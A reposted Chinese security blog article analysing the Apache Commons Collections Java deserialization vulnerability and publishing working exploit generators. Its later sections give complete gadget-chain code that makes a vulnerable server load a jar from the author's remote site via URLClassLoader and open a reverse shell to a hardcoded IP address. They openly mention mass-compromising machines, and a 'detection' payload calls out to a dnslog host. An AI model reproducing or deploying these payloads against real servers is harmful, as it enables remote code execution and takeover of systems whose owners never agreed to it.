> 原文链接: https://www.anquanke.com//post/id/82934 


# JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用


                                阅读量   
                                **151777**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t0163a3b143fdc96b79.jpg)](https://p3.ssl.qhimg.com/t0163a3b143fdc96b79.jpg)

> 本文主要讨论Apache CommonsCollections组件的Deserialize功能存在的问题,该问题其实在2015年1月份在国外已经被发现,直到在今年11月初才被国内相关网站发现并且在安全圈子里面迅速升温,不少安全公司已经采用批量化的程序对互联网上受影响的网站进行检测,由于CommonsCollections为Apache开源项目的重要组件,所以该组建的使用量非常大,这次主要是JBOSS,weblogic等中间件受影响,通过对漏洞的POC进行修改,可以直接控制受影响的服务器。

****

**漏洞原理分析**

该漏洞的出现的根源在CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法,并且该方法在相关对象反序列化时并未进行任何校验,新版本的修复方案对相关反射调用进行了限制。

问题函数主要出现在org.apache.commons.collections.Transformer接口上,我们可以看到该接口值定义了一个方法

[![](https://p3.ssl.qhimg.com/t01f26d982748c23b26.jpg)](http://www.iswin.org/attach/transformer_interface.png)



我们可以看到该方法的作用是给定一个Object对象经过转换后同时也返回一个Object,我们来看看该接口有哪些实现类

[![](https://p4.ssl.qhimg.com/t019797407ab73b0ff2.jpg)](http://www.iswin.org/attach/implements-transformer.png)



这些transformer的实现类中,我们一眼就看到了这里的InvokerTransformer,搞JAVA的对invoke这个词应该比较敏感,我们跟进这个实现类去看看具体的实现,

[![](https://p2.ssl.qhimg.com/t0150d3a7cf4b4b105a.jpg)](http://www.iswin.org/attach/invokeTransformer.png)



我们可以看到该该方法中采用了反射的方法进行函数调用,Input参数为要进行反射的对象(反射相关的知识就不在这赘述了),iMethodName,iParamTypes为调用的方法名称以及该方法的参数类型,iArgs为对应方法的参数,在invokeTransformer这个类的构造函数中我们可以发现,这三个参数均为可控参数

```
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) `{`
       super();
       iMethodName = methodName;
       iParamTypes = paramTypes;
       iArgs = args;
   `}`
```

那么现在核心的问题就是寻找哪些类调用了Transformer接口中的transform方法,通过eclipse我们找到了以下类调用了该方法

[![](https://p4.ssl.qhimg.com/t01b9dfeef9ae405230.jpg)](http://www.iswin.org/attach/transformermap.png)



这里我们可以看到有两个比较明显的类调用了transform方法,分别是



LazyMap

TransformedMap



****

**LazyMap构造POC**

这里对于网上给出的POC使用的是LazyMap来进行构造,其实这里TransformedMap构造更为简单,因为触发条件比较简单,后面会具体分析。<br>这里以网上给出的[POC](https://github.com/frohoff/ysoserial/)来进行分析,毕竟大家都在用么。

这里LazyMap实现了Map接口,其中的get(Object)方法调用了transform方法,跟进函数进去



```
public Object get(Object key) `{`
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) `{`
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    `}`
    return map.get(key);
`}`
```

这里可以看到,在调用transform方法之前会先判断当前Map中是否已经有该key,如果没有最终会由这里的factory.transform进行处理,我吗继续跟踪下facory这个变量看看该变量是再哪被初始化的,

```
public static Map decorate(Map map, Transformer factory) `{`
    return new LazyMap(map, factory);
`}`
```

这里的decorate方法会对factory进行初始化,同时实例化一个LazyMap,到这里就比较有意思了。

为了能成功调用transform方法,我们找到了LazyMap方法,发现在get()方法中调用了该方法,所以说现在漏洞利用的核心条件就是去寻找一个类,在对象进行反序列化时会调用我们精心构造对象的get(Object)方法,老外在这里找到了一个方法的确能在反序列化时触发LazyMap的get(Object)方法,老外的这种精神必须佩服!

现在重点现在转移到sun.reflect.annotation.AnnotationInvocationHandler类上,我们看看在该类进行反序列化的时候究竟是如何触发漏洞代码的。

跟进sun.reflect.annotation.AnnotationInvocationHandler的源代码

[![](https://p2.ssl.qhimg.com/t01702edc95f2aa7d8c.jpg)](http://www.iswin.org/attach/AnnotationInvocationHandler.png)

在反序列的时候程序首先会调用调用readObject这个方法,我们首先看看这个readObject方法

[![](https://p3.ssl.qhimg.com/t015a4f6c2f435ce8ae.jpg)](http://www.iswin.org/attach/readObject.png)



这里的memberValues是我们通过构造AnnotationInvocationHandler 构造函数初始化的变量,也就是我们构造的lazymap对象,这里我们只需要找到一个memberValues.get(Object)的方法即可触发该漏洞,但是可惜的是该方法里面并没有这个方法。

到这里,在老外给的POC里面,有一个Proxy.newInstance(xx)的方法,很多人可能不太明白老外为什么这里需要用到动态代理,这里也就是POC的精华之处了,我们在readObject方法中并未找到lazymap的get方法,但是我们继续在sun.reflect.annotation.AnnotationInvocationHandler类里面找看看那个方法调用了memberValues.get(Object)方法,很幸运我们发现在invoke方法中memberValues.get(Object)被调用

[![](https://p2.ssl.qhimg.com/t016333dc2baf7024ef.jpg)](http://www.iswin.org/attach/invoke-poc.png)



这里大家应该能明白老外为什么要用动态代理来进行构造POC了,因为AnnotationInvocationHandler默认实现了InvocationHandler接口,在用Object iswin=Proxy.newInstance(classloader,interface,InvocationHandler)生成动态代理后,当对象iswin在进行对象调用时,那么就会调用InvocationHandler.invoke(xx)方法,所以POC的执行流程为map.xx-&gt;proxy(Map).invoke-&gt;lazymap.get(xx) 就会触发transform方法从而执行恶意代码。

这里的ChainedTransformer为链式的Transformer,会挨个执行我们定义的Transformer,这里比较简单,有兴趣自己去看源码就知道。



**TransformedMap构造POC<br>**

这里如果使用TransformedMap来进行POC的构造就非常简单了,我们跟进TransformedMap的checkSetValue方法



```
protected Object checkSetValue(Object value) `{`
       return valueTransformer.transform(value);
   `}`
```

我们继续看checkSetValue被那个函数所调用,在MapEntry类中的setValue恰好调用了checkSetValue,这里直接触发了tranform函数,用TransformedMap来构造POC为什么说比LazyMap好呢,那是因为这里触发的条件比较简单,我们可以在sun.reflect.annotation.AnnotationInvocationHandler中的readObject(xxx)

[![](https://p3.ssl.qhimg.com/t015a4f6c2f435ce8ae.jpg)](http://www.iswin.org/attach/readObject.png)



这里我们明显可以看到memberValue.setValue(xxx)方法,所以我们只需要构造一个不为空的TransformedMap,在AnnotationInvocationHandler.readObject(xx)事就会触发漏洞,需要注意,这里的触发的类为AnnotationInvocationHandler,在触发漏洞事会对type进行检查,所以在transformer的时候我们要讲type设置为annotation类型。

所以这里POC执行流程为TransformedMap-&gt;AnnotationInvocationHandler.readObject()-&gt;setValue()-&gt;checkSetValue()漏洞成功触发。

**利用代码**

```
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
/**
 * @ClassName: Main.java
 * @Description: TODO
 * @author iswin
 * @email admin@iswin.org
 * @Date 2015年11月8日 下午12:12:13
 */
public class Main `{`
public static Object Reverse_Payload(String execArgs) throws Exception `{`
final Transformer[] transforms = new Transformer[] `{`
new ConstantTransformer(Runtime.class),
new InvokerTransformer("getMethod", new Class[] `{` String.class,
Class[].class `}`, new Object[] `{` "getRuntime",
new Class[0] `}`),
new InvokerTransformer("invoke", new Class[] `{` Object.class,
Object[].class `}`, new Object[] `{` null, new Object[0] `}`),
new InvokerTransformer("exec", new Class[] `{` String.class `}`,
execArgs), new ConstantTransformer(1) `}`;
Transformer transformerChain = new ChainedTransformer(transforms);
Map innermap = new HashMap();
innermap.put("value", "value");
Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
Class cls = Class
.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
ctor.setAccessible(true);
Object instance = ctor.newInstance(Retention.class, outmap);
return instance;
`}`
public static void main(String[] args) throws Exception `{`
GeneratePayload(Reverse_Payload("cmd"),
"/Users/iswin/Downloads/test.bin");
`}`
public static void GeneratePayload(Object instance, String file)
throws Exception `{`
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
`}`
public static void payloadTest(String file) throws Exception `{`
// 这里为测试上面的tansform是否会触发payload
// Map.Entry onlyElement =(Entry) outmap.entrySet().iterator().next();
// onlyElement.setValue("foobar");
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
in.readObject();
in.close();
`}`
`}`
```

****

**漏洞高级利用**<br>

现在网上给出的poc只能执行命令或者写个文件之类的,本文将介绍一种通用的漏洞利用方法,只要服务器可以出网,就可以进行任何操作,例如反弹个shell,写文件?当然还有抓鸡等。

漏洞原理什么的在上面已经分析过了,网上的POC都是调用RunTime.getRuntime().exec(“cmdxx”),很多人在问这个漏洞执行命令后能不能回显,对于回显,其实就是想办法拿到容器的response,但是非常遗憾,我在对jboss进行测试时并未找到一种方式可以获取当当前请求的response,其他容器就不清楚了,理论上只要找到一个方法可以获取到当前请求的response,那么回显就搞定了,期待有大牛来实现。

到目前为止,我们只能通过反射的方式来进行函数调用,如果要实现复杂的功能,估计构造POC会把人折磨死,所以是不是有一种通用的方法去加载我们的payload呢。

在java中有个URLClassLoader类,关于该类的作用大家自己去百度,简单说就是远程加载class到本地jvm中,说到这,我想稍微明白一点的就知道怎么做了,这里不废话了,文章写得累死了,直接给出POC吧,至于具体怎么利用,如何实现抓鸡等,明白人自然就明白。

**反弹shell**

反弹shell的原理,通过classload从我博客远程加载一个[http://www.isiwn.org/attach/iswin.jar文件,然后进行实例化,博客上的jar文件里面包含了反弹shell的脚本,将类加载到本地后实例化实例化时在构造方法中执行反弹shell的payload。](http://www.isiwn.org/attach/iswin.jar%E6%96%87%E4%BB%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%9B%E8%A1%8C%E5%AE%9E%E4%BE%8B%E5%8C%96%EF%BC%8C%E5%8D%9A%E5%AE%A2%E4%B8%8A%E7%9A%84jar%E6%96%87%E4%BB%B6%E9%87%8C%E9%9D%A2%E5%8C%85%E5%90%AB%E4%BA%86%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%84%9A%E6%9C%AC,%E5%B0%86%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%88%B0%E6%9C%AC%E5%9C%B0%E5%90%8E%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AE%9E%E4%BE%8B%E5%8C%96%E6%97%B6%E5%9C%A8%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E4%B8%AD%E6%89%A7%E8%A1%8C%E5%8F%8D%E5%BC%B9shell%E7%9A%84payload%E3%80%82)

**直接上代码**

LazyMap的实现方式

我已经对网上的poc进行了修改,修改的更加容易阅读,方便大家学习。



```
package ysoserial.payloads;
import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
public class CommonsCollections1`{`
public InvocationHandler getObject(final String ip) throws Exception `{`
// inert chain for setup
final Transformer transformerChain = new ChainedTransformer(
new Transformer[] `{` new ConstantTransformer(1) `}`);
// real chain for after setup
final Transformer[] transformers = new Transformer[] `{`
new ConstantTransformer(java.net.URLClassLoader.class),
// getConstructor class.class classname
new InvokerTransformer("getConstructor",
new Class[] `{` Class[].class `}`,
new Object[] `{` new Class[] `{` java.net.URL[].class `}` `}`),
// newinstance string http://www.iswin.org/attach/iswin.jar
new InvokerTransformer(
"newInstance",
new Class[] `{` Object[].class `}`,
new Object[] `{` new Object[] `{` new java.net.URL[] `{` new java.net.URL(
"http://www.iswin.org/attach/iswin.jar") `}` `}` `}`),
// loadClass String.class R
new InvokerTransformer("loadClass",
new Class[] `{` String.class `}`, new Object[] `{` "R" `}`),
// set the target reverse ip and port
new InvokerTransformer("getConstructor",
new Class[] `{` Class[].class `}`,
new Object[] `{` new Class[] `{` String.class `}` `}`),
// invoke
new InvokerTransformer("newInstance",
new Class[] `{` Object[].class `}`,
new Object[] `{` new String[] `{` ip `}` `}`),
new ConstantTransformer(1) `}`;
final Map innerMap = new HashMap();
final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
//this will generate a AnnotationInvocationHandler(Override.class,lazymap) invocationhandler
InvocationHandler invo = (InvocationHandler) getFirstCtor(
"sun.reflect.annotation.AnnotationInvocationHandler")
.newInstance(Retention.class, lazyMap);
//generate object which implements specifiy interface 
final Map mapProxy = Map.class.cast(Proxy.newProxyInstance(this
.getClass().getClassLoader(), new Class[] `{` Map.class `}`, invo));
final InvocationHandler handler = (InvocationHandler) getFirstCtor(
"sun.reflect.annotation.AnnotationInvocationHandler")
.newInstance(Retention.class, mapProxy);
setFieldValue(transformerChain, "iTransformers", transformers);
return handler;
`}`
public static Constructor&lt;?&gt; getFirstCtor(final String name)
throws Exception `{`
final Constructor&lt;?&gt; ctor = Class.forName(name)
.getDeclaredConstructors()[0];
ctor.setAccessible(true);
return ctor;
`}`
public static Field getField(final Class&lt;?&gt; clazz, final String fieldName)
throws Exception `{`
Field field = clazz.getDeclaredField(fieldName);
if (field == null &amp;&amp; clazz.getSuperclass() != null) `{`
field = getField(clazz.getSuperclass(), fieldName);
`}`
field.setAccessible(true);
return field;
`}`
public static void setFieldValue(final Object obj, final String fieldName,
final Object value) throws Exception `{`
final Field field = getField(obj.getClass(), fieldName);
field.set(obj, value);
`}`
public static void main(final String[] args) throws Exception `{`
final Object objBefore = CommonsCollections1.class.newInstance()
.getObject("10.18.180.34:8080");
//deserialize(serialize(objBefore));
File f = new File("/Users/iswin/Downloads/payloadsfinal.bin");
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(objBefore);
out.flush();
out.close();
`}`
`}`
```

**效果<br>**

[![](https://p1.ssl.qhimg.com/t01616517de9852d94c.jpg)](http://www.iswin.org/attach/reverse.png)

****

**TransformedMap的实现方式**

直接上代码



```
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
/**
 * @ClassName: Main.java
 * @Description: TODO
 * @author iswin
 * @email admin@iswin.org
 * @Date 2015年11月8日 下午12:12:13
 */
public class Main `{`
public static Object Reverse_Payload(String ip, int port) throws Exception `{`
final Transformer[] transforms = new Transformer[] `{`
new ConstantTransformer(java.net.URLClassLoader.class),
// getConstructor class.class classname
new InvokerTransformer("getConstructor",
new Class[] `{` Class[].class `}`,
new Object[] `{` new Class[] `{` java.net.URL[].class `}` `}`),
// newinstance string http://www.iswin.org/attach/iswin.jar
new InvokerTransformer(
"newInstance",
new Class[] `{` Object[].class `}`,
new Object[] `{` new Object[] `{` new java.net.URL[] `{` new java.net.URL(
"http://www.iswin.org/attach/iswin.jar") `}` `}` `}`),
// loadClass String.class R
new InvokerTransformer("loadClass",
new Class[] `{` String.class `}`, new Object[] `{` "R" `}`),
// set the target reverse ip and port
new InvokerTransformer("getConstructor",
new Class[] `{` Class[].class `}`,
new Object[] `{` new Class[] `{` String.class `}` `}`),
// invoke
new InvokerTransformer("newInstance",
new Class[] `{` Object[].class `}`,
new Object[] `{` new String[] `{` ip + ":" + port `}` `}`),
new ConstantTransformer(1) `}`;
Transformer transformerChain = new ChainedTransformer(transforms);
Map innermap = new HashMap();
innermap.put("value", "value");
Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
Class cls = Class
.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
ctor.setAccessible(true);
Object instance = ctor.newInstance(Retention.class, outmap);
return instance;
`}`
public static void main(String[] args) throws Exception `{`
GeneratePayload(Reverse_Payload("146.185.182.237", 8090),
"/Users/iswin/Downloads/test.bin");
`}`
public static void GeneratePayload(Object instance, String file)
throws Exception `{`
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
`}`
public static void payloadTest(String file) throws Exception `{`
// 这里为测试上面的tansform是否会触发payload
// Map.Entry onlyElement =(Entry) outmap.entrySet().iterator().next();
// onlyElement.setValue("foobar");
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
in.readObject();
in.close();
`}`
`}`
```

**漏洞检测?<br>**

这里提供一个poc供大家进行检测,其实就是发送一个http请求到指定ip,然后参数中带有特定特征来判断是否存在漏洞,直接观察日志就可以了。



```
package iswin;
import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
public class CommonsCollections1 `{`
public InvocationHandler getObject(final String ip) throws Exception `{`
final Transformer transformerChain = new ChainedTransformer(
new Transformer[] `{` new ConstantTransformer(1) `}`);
final Transformer[] transformers = new Transformer[] `{`
new ConstantTransformer(java.net.URL.class),
new InvokerTransformer("getConstructor",
new Class[] `{` Class[].class `}`,
new Object[] `{` new Class[] `{` String.class `}` `}`),
new InvokerTransformer("newInstance",
new Class[] `{` Object[].class `}`,
new Object[] `{` new String[] `{` ip `}` `}`),
new InvokerTransformer("openStream", new Class[] `{``}`,
new Object[] `{``}`), new ConstantTransformer(1) `}`;
// final Map innerMap = new HashMap();
//
// final Map lazyMap = LazyMap.decorate(new HashMap(),
// transformerChain);
// this will generate a
// AnnotationInvocationHandler(Override.class,lazymap) invocationhandler
InvocationHandler invo = (InvocationHandler) getFirstCtor(
"sun.reflect.annotation.AnnotationInvocationHandler")
.newInstance(Override.class,
LazyMap.decorate(new HashMap(), transformerChain));
final Map mapProxy = Map.class.cast(Proxy.newProxyInstance(this
.getClass().getClassLoader(), new Class[] `{` Map.class `}`, invo));
final InvocationHandler handler = (InvocationHandler) getFirstCtor(
"sun.reflect.annotation.AnnotationInvocationHandler")
.newInstance(Override.class, mapProxy);
setFieldValue(transformerChain, "iTransformers", transformers);
return handler;
`}`
public static Constructor&lt;?&gt; getFirstCtor(final String name)
throws Exception `{`
final Constructor&lt;?&gt; ctor = Class.forName(name)
.getDeclaredConstructors()[0];
ctor.setAccessible(true);
return ctor;
`}`
public static Field getField(final Class&lt;?&gt; clazz, final String fieldName)
throws Exception `{`
Field field = clazz.getDeclaredField(fieldName);
if (field == null &amp;&amp; clazz.getSuperclass() != null) `{`
field = getField(clazz.getSuperclass(), fieldName);
`}`
field.setAccessible(true);
return field;
`}`
public static void setFieldValue(final Object obj, final String fieldName,
final Object value) throws Exception `{`
final Field field = getField(obj.getClass(), fieldName);
field.set(obj, value);
`}`
public static void main(final String[] args) throws Exception `{`
final Object objBefore = CommonsCollections1.class.newInstance()
.getObject("http://abc.333d61.dnslog.info/tangscan/iswin.jpg");
File f = new File("/Users/iswin/Downloads/hello.bin");
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(objBefore);
out.flush();
out.close();
// Serializables.deserialize(Serializables.serialize(objBefore));
`}`
`}`
```

****

**参考资料<br>**

[1] :[https://github.com/frohoff/ysoserial/](https://github.com/frohoff/ysoserial/)

[2] :[http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#jboss](http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#jboss)
